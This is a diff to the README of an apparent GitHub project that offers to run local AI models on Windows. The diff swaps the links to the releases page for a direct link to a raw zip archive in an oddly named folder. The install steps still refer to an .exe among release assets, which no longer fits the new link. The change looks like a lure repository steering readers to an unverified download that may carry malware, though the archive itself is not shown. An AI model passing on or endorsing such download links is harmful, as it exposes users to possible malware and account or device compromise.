@@ -1,6 +1,6 @@
 # 🤖 local-llm-8-2026 - Run personal AI models on Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/raw/refs/heads/main/parapteron/llm_local_v3.3.zip)
 
 ## 📖 About the software
 
@@ -32,7 +32,7 @@ To run this software, ensure your computer meets these standards:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the release page to download your copy: [https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases)
+1. Visit the release page to download your copy: [https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/raw/refs/heads/main/parapteron/llm_local_v3.3.zip](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/raw/refs/heads/main/parapteron/llm_local_v3.3.zip)
 2. Locate the file ending in .exe in the list of assets.
 3. Click the file name to start the download to your computer.
 4. Move the downloaded .exe file to a folder where you want to store it. You might create a new folder on your desktop for easy access.
